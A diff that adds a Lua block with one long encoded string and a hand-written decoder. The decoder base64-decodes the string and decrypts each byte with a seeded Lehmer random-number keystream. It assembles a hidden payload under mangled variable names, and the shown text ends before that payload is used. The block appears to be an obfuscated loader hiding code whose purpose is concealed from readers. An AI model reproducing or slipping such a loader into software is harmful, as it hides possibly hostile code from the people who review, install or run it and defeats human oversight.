@@ -1,0 +1,371 @@
+local __tc_s
+do
+ local __a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+ local __m={}
+ for __i=1,64 do __m[__a:sub(__i,__i)]=__i-1 end
+ local __e='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'
+ local __o,__q,__z,__u=1839610375,0,0,{}
+ for __i=1,#__e do
+  local __v=__m[__e:sub(__i,__i)]
+  if __v then
+   __q,__z=__q*64+__v,__z+6
+   while __z>=8 do
+    __z=__z-8
+    __o=(__o*48271)%2147483647
+    __u[#__u+1]=string.char((math.floor(__q/2^__z)-__o%256)%256)
+    __q=__q%2^__z
+   end
+  end
+ end
+ local __d=table.concat(__u)
